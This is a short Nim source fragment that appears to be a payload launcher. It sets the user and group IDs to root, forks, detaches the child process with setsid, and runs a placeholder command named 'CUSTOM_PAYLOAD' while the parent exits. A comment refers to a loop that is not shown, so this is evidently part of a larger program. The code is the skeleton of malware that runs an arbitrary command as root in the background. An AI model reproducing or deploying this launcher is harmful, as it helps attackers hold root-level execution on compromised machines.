import std/osproc
import std/posix

when isMainModule:
  discard setuid(0);
  discard setgid(0);
  # Still in the loop from above
  let pid = fork()
  if pid == 0:
    # Child process
    discard setsid()
    discard execCmdEx("CUSTOM_PAYLOAD");
  else: quit(QuitSuccess)